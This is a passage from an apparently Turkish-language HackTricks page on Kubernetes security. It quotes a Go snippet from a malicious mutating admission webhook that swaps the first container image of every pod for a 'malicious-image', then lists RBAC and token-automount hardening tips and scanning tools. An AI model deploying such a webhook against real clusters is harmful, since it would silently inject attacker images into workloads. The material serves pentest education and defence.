#### Teknik Detaylar <a href="#heading-technicalities" id="heading-technicalities"></a>

`./deploy.sh` betiği, istekleri değiştiren bir webhook admission controller oluşturur ve yapılandırma satırlarında belirtildiği gibi Kubernetes API'sine yapılan istekleri değiştirerek gözlemlenen sonuçları etkiler:
```
patches = append(patches, patchOperation{
Op:    "replace",
Path:  "/spec/containers/0/image",
Value: "rewanthtammana/malicious-image",
})
```
Yukarıdaki parça, her poddaki ilk konteyner görüntüsünü `rewanthtammana/malicious-image` ile değiştirir.

## OPA Gatekeeper atlatma

{% content-ref url="../kubernetes-opa-gatekeeper/kubernetes-opa-gatekeeper-bypass.md" %}
[kubernetes-opa-gatekeeper-bypass.md](../kubernetes-opa-gatekeeper/kubernetes-opa-gatekeeper-bypass.md)
{% endcontent-ref %}

## En İyi Uygulamalar

### **Servis Hesabı Tokenlarının Otomatik Bağlanmasını Devre Dışı Bırakma**

* **Podlar ve Servis Hesapları**: Varsayılan olarak, podlar bir servis hesabı tokenunu bağlar. Güvenliği artırmak için, Kubernetes bu otomatik bağlanma özelliğini devre dışı bırakma izni verir.
* **Nasıl Uygulanır**: Kubernetes sürümü 1.6'dan başlayarak, servis hesapları veya podların yapılandırmasında `automountServiceAccountToken: false` olarak ayarlayın.

### **RolBağlama/KümeRolBağlama'da Kısıtlayıcı Kullanıcı Ataması**

* **Seçici Dahil Etme**: RolBağlama veya KümeRolBağlama'ya yalnızca gerekli kullanıcıların dahil edildiğinden emin olun. Sık ​​sık denetleyin ve gereksiz kullanıcıları kaldırarak sıkı güvenliği koruyun.

### **Küme Geniş Rol Yerine Ad Alanı Özgü Roller**

* **Roller vs. KümeRoller**: İzinlerin ad alanı özgü olmasını tercih edin ve bunun için Roller ve RolBağlama kullanın, küme genişinde uygulanan KümeRoller ve KümeRolBağlama yerine. Bu yaklaşım daha ince kontrol sağlar ve izinlerin kapsamını sınırlar.

### **Otomatik araçlar kullanın**

{% embed url="https://github.com/cyberark/KubiScan" %}

{% embed url="https://github.com/aquasecurity/kube-hunter" %}

{% embed url="https://github.com/aquasecurity/kube-bench" %}

## **Referanslar**

* [**https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions**](https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions)
* [**https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1**](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1)
* [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers)

{% hint style="success" %}
AWS Hacking öğrenin ve uygulayın:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Eğitim AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking öğrenin ve uygulayın: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Eğitim GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [Discord grubuna](https://discord.gg/hRep4RUj7f) veya [telegram grubuna](https://t.me/peass) katılın veya** bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarını göndererek HackTricks ve HackTricks Cloud github depolarına PR göndererek paylaşın.**

</details>
{% endhint %}
